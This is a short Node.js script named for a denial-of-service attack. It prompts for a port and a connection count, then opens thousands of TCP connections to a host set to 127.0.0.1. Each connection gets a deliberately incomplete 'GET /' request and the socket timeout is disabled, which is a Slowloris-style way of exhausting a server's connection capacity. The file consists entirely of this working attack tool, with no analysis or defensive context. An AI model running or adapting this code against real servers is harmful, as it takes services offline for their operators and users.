const net = require('net')
const readline = require('readline-promise').default
let activeConnections = 0

let host = "127.0.0.1"
const rlp = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    terminal: true
})

dosAttack()

function dosAttack() {
    rlp.questionAsync('Which port? ').then(p => {
        rlp.questionAsync('How many connections? ').then(c => {
            const port = p ? p : 3000
            const connections = c ? c : 5000
            req = createRequest()

            for (let i = 0; i < connections; i++) {
                sendRequest(req, port)
            }
        })
    })
}

function createRequest() {
    return 'GET /'
}

function sendRequest(req, port) {
    const connection = net.connect(port, host, function () {
        activeConnections++
        console.log('Started connection')
        console.log('Active connections: ' + activeConnections)
        
        connection.write(req)
    })

    connection.setTimeout(0)

    connection.on('error', () => {
        console.log('Closed connection')
        activeConnections--
    })
}
